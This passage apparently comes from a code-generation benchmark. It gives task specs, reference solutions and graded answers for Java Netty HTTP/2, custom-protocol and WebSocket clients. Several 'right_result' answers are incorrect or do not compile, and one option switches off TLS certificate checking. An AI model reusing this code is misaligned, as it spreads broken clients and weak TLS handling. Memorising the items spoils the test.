ctx) throws Exception {\n            // Trigger reconnection logic here\n        }\n    }\n\n    private static class ChannelConnectListener implements ChannelFutureListener {\n        private final NettyTcpClient client;\n\n        public ChannelConnectListener(NettyTcpClient client) {\n            this.client = client;\n        }\n\n        @Override\n        public void operationComplete(ChannelFuture future) throws Exception {\n            if (!future.isSuccess()) {\n                future.cause().printStackTrace();\n                // Retry connection after some delay\n                Thread.sleep(5000);\n                client.connect();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 147,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework, capable of establishing TCP connections, sending HTTP requests, and handling responses.\n\nClass Description: NettyHttp2Client is a HTTP/2 client implementation using Netty's non-blocking I/O. It manages connection lifecycle, sends HTTP requests, and processes responses through configured handlers.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline with HTTP/2 handlers\n- bootstrap: [Bootstrap] - Configures and manages the TCP client connection\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- NettyHttp2Client(String host, int port) -> [Constructor] - Initializes the client with target host and port\n- configureBootstrap(String host, int port) -> [void] - Configures the bootstrap with connection parameters\n- connect() -> [void] - Establishes connection to the server\n- sendRequest(URI hostName) -> [void] - Sends HTTP GET request to specified URI\n- disconnect() -> [void] - Closes connection and releases resources\n\nNested Classes:\n- Http2ClientInitializer: [ChannelInitializer<SocketChannel>] - Configures the pipeline for HTTP/2 communication\n- Http2SettingsHandler: [SimpleChannelInboundHandler<Http2Settings>] - Handles HTTP/2 settings negotiation\n- UpgradeRequestHandler: [ChannelInboundHandlerAdapter] - Manages HTTP upgrade to HTTP/2\n- UserEventLogger: [ChannelInboundHandlerAdapter] - Logs channel events",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpClientUpgradeHandler;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http2.DefaultHttp2Connection;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameReader;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameWriter;\nimport io.netty.handler.codec.http2.DelegatingDecompressorFrameListener;\nimport io.netty.handler.codec.http2.Http2ClientUpgradeCodec;\nimport io.netty.handler.codec.http2.Http2Connection;\nimport io.netty.handler.codec.http2.Http2FrameLogger;\nimport io.netty.handler.codec.http2.Http2FrameReader;\nimport io.netty.handler.codec.http2.Http2FrameWriter;\nimport io.netty.handler.codec.http2.Http2InboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2OutboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2Settings;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandler;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandlerBuilder;\nimport io.netty.handler.codec.http2.InboundHttp2ToHttpAdapterBuilder;\nimport io.netty.handler.logging.LogLevel;\nimport java.net.URI;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttp2Client {\n\n    private final EventLoopGroup workerGroup;\n    private final Http2ClientInitializer initializer;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        this.workerGroup = new NioEventLoopGroup();\n        this.initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n        this.bootstrap = new Bootstrap();\n        configureBootstrap(host, port);\n    }\n\n    private void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .remoteAddress(host, port)\n                .handler(initializer);\n    }\n\n    public void connect() {\n        channel = bootstrap.connect().syncUninterruptibly().channel();\n        Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n    }\n\n    public void sendRequest(URI hostName) throws Exception {\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        final ChannelPromise promise = channel.newPromise();\n        responseHandler.put(streamId, promise);\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, hostName.toString());\n        request.headers().add(HttpHeaderNames.HOST, hostName);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n        channel.writeAndFlush(request);\n        promise.await(10, TimeUnit.SECONDS);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        private static final Http2FrameLogger logger = new Http2FrameLogger(LogLevel.INFO, Http2ClientInitializer.class);\n        private final int maxContentLength;\n        private HttpToHttp2ConnectionHandler connectionHandler;\n        private HttpResponseHandler responseHandler;\n        private Http2SettingsHandler settingsHandler;\n\n        Http2ClientInitializer(int maxContentLength) {\n            this.maxContentLength = maxContentLength;\n        }\n\n        @Override\n        public void initChannel(SocketChannel ch) throws Exception {\n            final Http2Connection connection = new DefaultHttp2Connection(false);\n            connectionHandler = new HttpToHttp2ConnectionHandlerBuilder()\n                    .connection(connection)\n                    .frameListener(new DelegatingDecompressorFrameListener(connection,\n                            new InboundHttp2ToHttpAdapterBuilder(connection)\n                                    .maxContentLength(maxContentLength)\n                                    .propagateSettings(true)\n                                    .build()))\n                    .build();\n            responseHandler = new HttpResponseHandler();\n            settingsHandler = new Http2SettingsHandler(ch.newPromise());\n            configureClearText(ch);\n        }\n\n        public HttpResponseHandler responseHandler() {\n            return responseHandler;\n        }\n\n        public Http2SettingsHandler settingsHandler() {\n            return settingsHandler;\n        }\n\n        protected void configureEndOfPipeline(ChannelPipeline pipeline) {\n            pipeline.addLast(settingsHandler, responseHandler);\n        }\n\n        private void configureClearText(SocketChannel ch) {\n            HttpClientCodec sourceCodec = new HttpClientCodec();\n            Http2ClientUpgradeCodec upgradeCodec = new Http2ClientUpgradeCodec(connectionHandler);\n            HttpClientUpgradeHandler upgradeHandler = new HttpClientUpgradeHandler(sourceCodec, upgradeCodec, 65536);\n            ch.pipeline().addLast(sourceCodec, upgradeHandler, new UpgradeRequestHandler(), new UserEventLogger());\n        }\n\n        private static Http2FrameReader frameReader() {\n            return new Http2InboundFrameLogger(new DefaultHttp2FrameReader(), logger);\n        }\n\n        private static Http2FrameWriter frameWriter() {\n            return new Http2OutboundFrameLogger(new DefaultHttp2FrameWriter(), logger);\n        }\n\n        private final class UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n            @Override\n            public void channelActive(ChannelHandlerContext ctx) throws Exception {\n                DefaultFullHttpRequest upgradeRequest =\n                        new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, \"/sdf\");\n                upgradeRequest.headers().add(\"Host\", \"default\");\n                ctx.writeAndFlush(upgradeRequest);\n                ctx.fireChannelActive();\n                ctx.pipeline().remove(this);\n                configureEndOfPipeline(ctx.pipeline());\n            }\n        }\n\n        private static class UserEventLogger extends ChannelInboundHandlerAdapter {\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                ctx.fireUserEventTriggered(evt);\n            }\n        }\n    }\n\n    static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        private final ChannelPromise promise;\n\n        Http2SettingsHandler(ChannelPromise promise) {\n            this.promise = promise;\n        }\n\n        public void awaitSettings(long timeout, TimeUnit unit) throws Exception {\n            if (!promise.awaitUninterruptibly(timeout, unit)) {\n                throw new IllegalStateException(\"Timed out waiting for settings\");\n            }\n            if (!promise.isSuccess()) {\n                throw new RuntimeException(promise.cause());\n            }\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2Settings msg) throws Exception {\n            promise.setSuccess();\n            ctx.pipeline().remove(this);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http2.*;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\n\nimport java.net.URI;\n\npublic class NettyHttp2Client {\n    private final NioEventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final Bootstrap bootstrap = new Bootstrap();\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        configureBootstrap(host, port);\n    }\n\n    private void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new Http2ClientInitializer());\n    }\n\n    public void connect() throws Exception {\n        channel = bootstrap.connect(\"localhost\", 8443).sync().channel();\n    }\n\n    public void sendRequest(URI hostName) {\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, hostName.toString());\n        request.headers().set(HttpHeaderNames.HOST, hostName.getHost());\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.UPGRADE);\n        request.headers().set(HttpHeaderNames.UPGRADE, \"h2c\");\n        channel.writeAndFlush(request);\n    }\n\n    public void disconnect() {\n        if (channel != null && channel.isActive()) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    private static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        @Override\n        protected void initChannel(SocketChannel ch) throws Exception {\n            SslContext sslCtx = SslContextBuilder.forClient()\n                    .build();\n            ChannelPipeline p = ch.pipeline();\n            p.addLast(sslCtx.newHandler(ch.alloc()));\n            p.addLast(new Http2MultiplexHandler(new Http2FrameCodecBuilder(true).frameListener((conn, frame) -> {}).build(),\n                    new ChannelDuplexHandler() {\n                        @Override\n                        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                            if (evt instanceof Http2UpgradeEvent) {\n                                ctx.fireUserEventTriggered(evt);\n                            } else {\n                                super.userEventTriggered(ctx, evt);\n                            }\n                        }\n                    }));\n            p.addLast(new Http2SettingsHandler());\n            p.addLast(new UpgradeRequestHandler());\n            p.addLast(new UserEventLogger());\n        }\n    }\n\n    private static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2Settings msg) throws Exception {\n            // Handle HTTP/2 settings\n        }\n    }\n\n    private static class UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof Http2UpgradeEvent) {\n                ctx.pipeline().remove(this);\n                ctx.fireUserEventTriggered(evt);\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n\n    private static class UserEventLogger extends ChannelInboundHandlerAdapter {\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            System.out.println(\"User Event: \" + evt.getClass().getSimpleName());\n            super.userEventTriggered(ctx, evt);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 148,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send protocol messages, and handle responses.\n\nClass Description: ProtocolClient is a Netty-based TCP client that connects to a specified host and port, sends custom protocol messages at regular intervals, and handles server responses. The client uses custom encoders/decoders for protocol message processing and maintains the connection until explicitly stopped.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server\n- MAX_FRAME_LENGTH: int (static final) - Maximum allowed frame length for messages (1MB)\n- LENGTH_FIELD_LENGTH: int (static final) - Length of the length field in protocol header (4 bytes)\n- LENGTH_FIELD_OFFSET: int (static final) - Offset of the length field in protocol header (6 bytes)\n- LENGTH_ADJUSTMENT: int (static final) - Adjustment value for the length field (0)\n- INITIAL_BYTES_TO_STRIP: int (static final) - Number of initial bytes to strip (0)\n\nMethods:\n- ProtocolClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- run() throws InterruptedException -> void - Main method that configures and starts the Netty client, establishes connection, and sends periodic messages\n  - Input: None\n  - Output: None (continuously runs until interrupted)\n  - Side effects: Creates network connection, sends messages every 2 seconds, handles responses\n  - Throws: InterruptedException if thread sleep is interrupted",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class ProtocolClient {\n\n    private String host;\n    private int port;\n\n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\n                            \"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH,\n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                ProtocolMsg msg = new ProtocolMsg();\n                ProtocolHeader protocolHeader = new ProtocolHeader();\n                protocolHeader.setMagic((byte) 0x01);\n                protocolHeader.setMsgType((byte) 0x01);\n                protocolHeader.setReserve((short) 0);\n                protocolHeader.setSn((short) 0);\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\u7591\u662f\u5730\u4e0a\u971c\";\n                StringBuffer sb = new StringBuffer();\n                for (int i = 0; i < 2700; i++) {\n                    sb.append(body);\n                }\n\n                byte[] bodyBytes = sb.toString().getBytes(\n                        Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                protocolHeader.setLen(bodySize);\n\n                msg.setProtocolHeader(protocolHeader);\n                msg.setBody(sb.toString());\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\n\npublic class ProtocolClient {\n    private final String host;\n    private final int port;\n    private static final int MAX_FRAME_LENGTH = 1 * 1024 * 1024; // 1MB\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n\n    public ProtocolClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new LengthFieldPrepender(LENGTH_FIELD_LENGTH));\n                     p.addLast(new LengthFieldBasedFrameDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                     p.addLast(new ClientHandler());\n                 }\n             });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class ClientHandler extends SimpleChannelInboundHandler<ByteBuf> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) throws Exception {\n            // Handle response from server\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ProtocolClient client = new ProtocolClient(\"example.com\", 8080);\n            client.run();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 149,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client capable of establishing WebSocket connections with support for SSL/TLS, SOCKS proxy, message compression, and idle connection handling.\n\nClass Description: The NettyTcpClient class provides functionality to connect to a WebSocket server using Netty's asynchronous event-driven network framework. It handles connection establishment, SSL/TLS encryption, proxy configuration, message processing, and graceful shutdown.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- uri: URI - The target WebSocket server URI\n- webSocketChannel: Channel - The active WebSocket channel\n- eventLoopGroup: NioEventLoopGroup - Manages client-side I/O threads\n- compressedMessages: boolean - Flag for enabling message compression\n- acceptAllCertificates: boolean - Flag for accepting all SSL certificates\n- enableLoggingHandler: boolean - Flag for enabling Netty's logging handler\n- loggingHandlerLevel: LogLevel - Logging level for Netty's logging handler\n- socksProxyHost: String - SOCKS proxy host address\n- socksProxyPort: Integer - SOCKS proxy port number\n\nMethods:\n- connect(): void - Establishes a WebSocket connection to the specified URI with configured options\n- disconnect(): void - Closes the WebSocket connection and releases resources\n- getWebSocketClientExtensionHandler(): WebSocketClientExtensionHandler -> WebSocketClientExtensionHandler - Returns the WebSocket extension handler (defaults to compression handler)\n- getWebSocketClientHandler(WebSocketClientHandshaker, WebSocketClientHandler.WebSocketMessageHandler): WebSocketClientHandler -> WebSocketClientHandler - Creates and returns a custom WebSocket client handler with ping/pong and channel state management",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.codec.http.websocketx.extensions.WebSocketClientExtensionHandler;\nimport io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketClientCompressionHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.proxy.Socks5ProxyHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.internal.SocketUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.URI;\nimport java.time.Duration;\n\npublic class NettyTcpClient {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n    private static final Duration DEFAULT_CONNECTION_TIMEOUT = Duration.ofSeconds(10);\n    private static final int DEFAULT_IDLE_TIMEOUT = 15;\n\n    private URI uri;\n    private Channel webSocketChannel;\n    private NioEventLoopGroup eventLoopGroup;\n    private boolean compressedMessages = false;\n    private boolean acceptAllCertificates = false;\n    private boolean enableLoggingHandler = false;\n    private LogLevel loggingHandlerLevel = LogLevel.DEBUG;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public void connect() {\n        try {\n            String scheme = uri.getScheme() == null ? \"ws\" : uri.getScheme();\n            String host = uri.getHost();\n            if (host == null) {\n                throw new IllegalArgumentException(\"Host cannot be null.\");\n            }\n\n            final int port = uri.getPort() == -1 ? \n                (\"ws\".equalsIgnoreCase(scheme) ? 80 : 443) : uri.getPort();\n\n            final boolean ssl = \"wss\".equalsIgnoreCase(scheme);\n            final SslContext sslCtx = ssl ? \n                SslContextBuilder.forClient()\n                    .trustManager(acceptAllCertificates ? InsecureTrustManagerFactory.INSTANCE : null)\n                    .build() : null;\n\n            WebSocketClientHandler handler = getWebSocketClientHandler(\n                WebSocketClientHandshakerFactory.newHandshaker(\n                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536),\n                message -> {});\n\n            if (eventLoopGroup == null || eventLoopGroup.isShutdown()) {\n                eventLoopGroup = new NioEventLoopGroup(2);\n            }\n\n            new Bootstrap()\n                .group(eventLoopGroup)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, \n                    (int) DEFAULT_CONNECTION_TIMEOUT.toMillis())\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        if (socksProxyHost != null) {\n                            p.addLast(new Socks5ProxyHandler(\n                                SocketUtils.socketAddress(socksProxyHost, socksProxyPort)));\n                        }\n                        if (sslCtx != null) {\n                            p.addLast(sslCtx.newHandler(ch.alloc(), host, port));\n                        }\n                        p.addLast(new HttpClientCodec());\n                        if (enableLoggingHandler) {\n                            p.addLast(new LoggingHandler(loggingHandlerLevel));\n                        }\n                        if (compressedMessages) {\n                            p.addLast(WebSocketClientCompressionHandler.INSTANCE);\n                        }\n                        p.addLast(new HttpObjectAggregator(8192));\n                        if (DEFAULT_IDLE_TIMEOUT > 0) {\n                            p.addLast(new IdleStateHandler(DEFAULT_IDLE_TIMEOUT, 0, 0));\n                        }\n                        WebSocketClientExtensionHandler clientExtensionHandler = \n                            getWebSocketClientExtensionHandler();\n                        if (clientExtensionHandler != null) {\n                            p.addLast(clientExtensionHandler);\n                        }\n                        p.addLast(handler);\n                    }\n                })\n                .connect(uri.getHost(), port)\n                .addListener((ChannelFuture channelFuture) -> {\n                    webSocketChannel = channelFuture.channel();\n                    if (!channelFuture.isSuccess()) {\n                        LOG.error(\"Connection failed\", channelFuture.cause());\n                    }\n                });\n        } catch (Exception e) {\n            LOG.error(\"Connection error\", e);\n        }\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully(2, DEFAULT_IDLE_TIMEOUT, TimeUnit.SECONDS);\n        }\n    }\n\n    protected WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return WebSocketClientCompressionHandler.INSTANCE;\n    }\n\n    protected WebSocketClientHandler getWebSocketClientHandler(\n        WebSocketClientHandshaker handshaker,\n        WebSocketClientHandler.WebSocketMessageHandler handler) {\n        return new WebSocketClientHandler(handshaker, handler) {\n            @Override\n            public void channelInactive(ChannelHandlerContext ctx) {\n                LOG.info(\"Channel inactive\");\n                ctx.close();\n            }\n\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                if (evt instanceof IdleStateEvent) {\n                    IdleStateEvent e = (IdleStateEvent) evt;\n                    if (e.state() == IdleState.READER_IDLE) {\n                        ctx.writeAndFlush(new PingWebSocketFrame());\n                    }\n                }\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketClientCompressionHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.proxy.ProxyHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class NettyTcpClient {\n    private static final Logger LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n    private URI uri;\n    private Channel webSocketChannel;\n    private EventLoopGroup eventLoopGroup;\n    private boolean compressedMessages;\n    private boolean acceptAllCertificates;\n    private boolean enableLoggingHandler;\n    private LogLevel loggingHandlerLevel;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public NettyTcpClient(URI uri) {\n        this.uri = uri;\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.compressedMessages = false;\n        this.acceptAllCertificates = false;\n        this.enableLoggingHandler = true;\n        this.loggingHandlerLevel = LogLevel.INFO;\n        this.socksProxyHost = null;\n        this.socksProxyPort = null;\n    }\n\n    public void connect() throws Exception {\n        SslContext sslCtx = null;\n        if (acceptAllCertificates) {\n            sslCtx = SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = SslContextBuilder.forClient().build();\n        }\n\n        Bootstrap b = new Bootstrap();\n        b.group(eventLoopGroup)\n         .channel(NioSocketChannel.class)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline pipeline = ch.pipeline();\n                 if (enableLoggingHandler) {\n                     pipeline.addLast(new LoggingHandler(loggingHandlerLevel));\n                 }\n                 if (socksProxyHost != null && socksProxyPort != null) {\n                     pipeline.addLast(new ProxyHandler(ProxyServer.valueOf(socksProxyHost + \":\" + socksProxyPort)));\n                 }\n                 pipeline.addLast(sslCtx.newHandler(ch.alloc(), uri.getHost(), uri.getPort()));\n                 if (compressedMessages) {\n                     pipeline.addLast(WebSocketClientCompressionHandler.INSTANCE);\n                 }\n                 pipeline.addLast(getWebSocketClientExtensionHandler());\n                 pipeline.addLast(new IdleStateHandler(0, 0, 60)); // Idle connection timeout\n                 pipeline.addLast(getWebSocketClientHandler(createHandshaker(uri), new WebSocketClientHandler.WebSocketMessageHandler() {\n                     @Override\n                     public void onMessage(String message) {\n                         // Handle incoming messages\n                     }\n\n                     @Override\n                     public void onClose(int statusCode, String reasonText) {\n                         // Handle close event\n                     }\n\n                     @Override\n                     public void onError(Throwable cause) {\n                         // Handle error\n                     }\n                 }));\n             }\n         });\n\n        ChannelFuture f = b.connect(uri.getHost(), uri.getPort()).sync();\n        webSocketChannel = f.channel();\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close();\n        }\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return compressedMessages ? WebSocketClientCompressionHandler.INSTANCE : null;\n    }\n\n    public WebSocketClientHandler getWebSocketClientHandler(WebSocketClientHandshaker handshaker, WebSocketClientHandler.WebSocketMessageHandler messageHandler) {\n        return new WebSocketClientHandler(handshaker, messageHandler) {\n            @Override\n            protected void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                if (evt instanceof IdleStateEvent) {\n                    IdleStateEvent e = (IdleStateEvent) evt;\n                    if (e.state() == IdleState.READER_IDLE) {\n                        ctx.writeAndFlush(PingWebSocketFrame.INSTANCE);\n                    }\n                } else {\n                    super.userEventTriggered(ctx, evt);\n                }\n            }\n        };\n    }\n\n    private WebSocketClientHandshaker createHandshaker(URI uri) {\n        WebSocketClientHandshakerFactory wsFactory = WebSocketClientHandshakerFactory.newHandshaker(\n                uri, WebSocketVersion.V13, null, compressedMessages, Collections.<String, String>emptyMap());\n        return wsFactory.newHandshaker(uri);\n    }\n}\n```"
  },
  {
    "Task_id": 15,
